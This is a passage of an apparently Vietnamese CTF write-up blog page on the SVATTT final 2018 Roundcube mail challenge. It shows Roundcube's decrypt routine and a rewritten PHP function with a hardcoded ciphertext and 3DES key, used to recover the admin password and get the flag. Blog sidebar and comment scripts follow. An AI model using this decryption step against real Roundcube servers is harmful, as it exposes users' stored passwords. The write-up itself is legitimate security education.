+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">862</span>        $clear <span style="color:#f92672">=</span> <span style="color:#a6e22e">mdecrypt_generic</span>($td, $cipher);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">863</span>        <span style="color:#a6e22e">mcrypt_generic_deinit</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">864</span>        <span style="color:#a6e22e">mcrypt_module_close</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">865</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">866</span>    <span style="color:#66d9ef">else</span> {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">867</span>        <span style="color:#f92672">@</span><span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#39;des.inc&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">868</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">869</span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;des&#39;</span>)) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">870</span>            $des_iv_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">871</span>            $iv <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, <span style="color:#ae81ff">0</span>, $des_iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">872</span>            $cipher <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, $des_iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">873</span>            $clear <span style="color:#f92672">=</span> <span style="color:#a6e22e">des</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">config</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_crypto_key</span>($key), $cipher, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, $iv);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">874</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">875</span>        <span style="color:#66d9ef">else</span> {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">876</span>            <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">raise_error</span>(<span style="color:#66d9ef">array</span>(
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">877</span>                <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">500</span>, <span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;php&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">878</span>                <span style="color:#e6db74">&#39;file&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">__FILE__</span>, <span style="color:#e6db74">&#39;line&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">__LINE__</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">879</span>                <span style="color:#e6db74">&#39;message&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Could not perform decryption; make sure Mcrypt is installed or lib/des.inc is available&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">880</span>                ), <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">true</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">881</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">882</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">883</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">884</span>    <span style="color:#75715e">/*-
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">885</span><span style="color:#75715e">     * Trim PHP&#39;s padding and the canary byte; see note in
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">886</span><span style="color:#75715e">     * rcube::encrypt() and http://php.net/mcrypt_generic#68082
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">887</span><span style="color:#75715e">     */</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">888</span>    $clear <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">rtrim</span>($clear, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>), <span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">889</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">890</span>    <span style="color:#66d9ef">return</span> $clear;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">891</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">892</span></code></pre></div>
+
+<p>Viết lại 1 function tương tự ở bên dưới file đó là xong.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 1</span><span style="color:#75715e">&lt;?php</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 2</span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">decrypt</span>($cipher<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV&#39;</span>, $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;HLxz-oU8UnnTY-es5Kc_%$f!&#39;</span>, $base64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 3</span>{
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 4</span>    $cipher <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($cipher);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 5</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 6</span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>(<span style="color:#e6db74">&#39;mcrypt_module_open&#39;</span>) <span style="color:#f92672">&amp;&amp;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 7</span>        ($td <span style="color:#f92672">=</span> <span style="color:#a6e22e">mcrypt_module_open</span>(<span style="color:#a6e22e">MCRYPT_TripleDES</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">MCRYPT_MODE_CBC</span>, <span style="color:#e6db74">&#34;&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 8</span>    ) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79"> 9</span>        $iv_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">mcrypt_enc_get_iv_size</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">10</span>        $iv <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, <span style="color:#ae81ff">0</span>, $iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">11</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">12</span>        <span style="color:#75715e">// session corruption? (#1485970)
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">13</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($iv) <span style="color:#f92672">&lt;</span> $iv_size) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">14</span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">15</span>        }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">16</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">17</span>        $cipher <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($cipher, $iv_size);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">18</span>        <span style="color:#a6e22e">mcrypt_generic_init</span>($td, $key, $iv);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">19</span>        $clear <span style="color:#f92672">=</span> <span style="color:#a6e22e">mdecrypt_generic</span>($td, $cipher);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">20</span>        <span style="color:#a6e22e">mcrypt_generic_deinit</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">21</span>        <span style="color:#a6e22e">mcrypt_module_close</span>($td);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">22</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">23</span>    $clear <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">rtrim</span>($clear, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>), <span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">24</span>    <span style="color:#66d9ef">echo</span> $clear;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">25</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">26</span></code></pre></div></p>
+
+<p>Vậy lấy được password admin, đăng nhập admin sẽ được flag vì trong file index.php có đoạn code sau:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">1</span><span style="color:#75715e">&lt;?php</span> <span style="color:#75715e">//index.php
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">2</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#39;mailadmin&#39;</span>){
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">3</span>    $OUTPUT<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show_message</span>($RCMAIL<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">config</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;flag&#39;</span>));
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">4</span>}
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7c7c79">5</span></code></pre></div>
+
+            </div>
+        </div>
+    </div>
+    <div class="column is-3">
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Tags</h1>
+        <div class="tags">
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/ctf">ctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/cve">cve</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/flask">flask</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/laravel">laravel</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/matesctf">matesctf</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/php">php</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/python">python</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/serialization">serialization</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-2018">svattt-2018</a></span>
+        
+            <span class="tag"><a href="https://hungry-visvesvaraya-d246d6.netlify.com/tags/svattt-final-2018">svattt-final-2018</a></span>
+        
+        </div>          
+    </div>
+</div><br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Recent posts</h1>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/new_year_2019/">New year 2019</a></h1>
+            <time class="has-text-grey-light is-size-7">1 January 2019</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_final_2018_web_2_roundcube_mail/">SVATTT final 2018 - roundcube mail</a></h1>
+            <time class="has-text-grey-light is-size-7">20 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/laravel-object-injection-to-rce/">Laravel object injection to RCE</a></h1>
+            <time class="has-text-grey-light is-size-7">25 October 2018</time>
+        
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/php_object_injection_without_unserialize/">Php Object Injection Without Unserialize</a></h1>
+            <time class="has-text-grey-light is-size-7">20 September 2018</time>
+        
+    </div>
+</div>
+    <br>
+                
+  
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Related posts</h1>
+      
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/svattt_2018_web_3_secure_document_service/">SVATTT 2018 - Secure document service</a></h1>
+            <time class="has-text-grey-light is-size-7">5 November 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf-final-2-brute-mongodb-_id/">Matesctf final 2 - Brute mongodb _id</a></h1>
+            <time class="has-text-grey-light is-size-7">13 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/meepwn_qual_round_web_pycalx_1/">Meepwn qual round - pycalx 1</a></h1>
+            <time class="has-text-grey-light is-size-7">11 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_rce/">Matesctf final 2 - IP Spoofing to RCE in flask</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_ssti/">Matesctf final 2 - SSTI</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+            <h1><a href="https://hungry-visvesvaraya-d246d6.netlify.com/post/matesctf_final_2_web_ex50_xxe/">Matesctf final 2 - XXE Injection</a></h1>
+            <time class="has-text-grey-light is-size-7">8 September 2018</time>
+      
+    </div>
+</div>
+
+    
+<br>
+        <div class="card">
+    <div class="card-content">
+        <h1 class="title is-5">Archives</h1>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2019">2019</a> (1)<br>
+        
+            <a href="https://hungry-visvesvaraya-d246d6.netlify.com/archives/2018">2018</a> (9)<br>
+        
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+    </div>
+    
+    <div id="disqus_thread"></div>
+</div>
+
+
+<script>
+
+
+
+
+var disqus_config = function () {
+this.page.url = "https:\/\/hungry-visvesvaraya-d246d6.netlify.com\/";  
+this.page.identifier = "blog-kev"; 
+};
+
+(function() { 
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-kev.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+
+<footer class="footer has-background-grey-darker has-text-white">
+    <div class="content has-text-centered">
+        <p>
+            <span class="icon is-large"><a href="https://twitter.com/" class="mysocial"><i class="fab fa-twitter fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://www.youtube.com/" class="mysocial"><i class="fab fa-youtube fa-3x"></i></a></span>&nbsp;&nbsp;
+            <span class="icon is-large"><a href="https://github.com/" class="mysocial"><i class="fab fa-github fa-3x"></i></a></span>&nbsp;&nbsp;
+            <br><br>
+            Copyright &copy; Hugo Theme 2019</a>
+        </p>
+    </div>
+</footer>
+
+<script defer src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
+
+<script id="dsq-count-scr" src="//blog-kev.disqus.com/count.js" async></script>
+</body>
+</html>
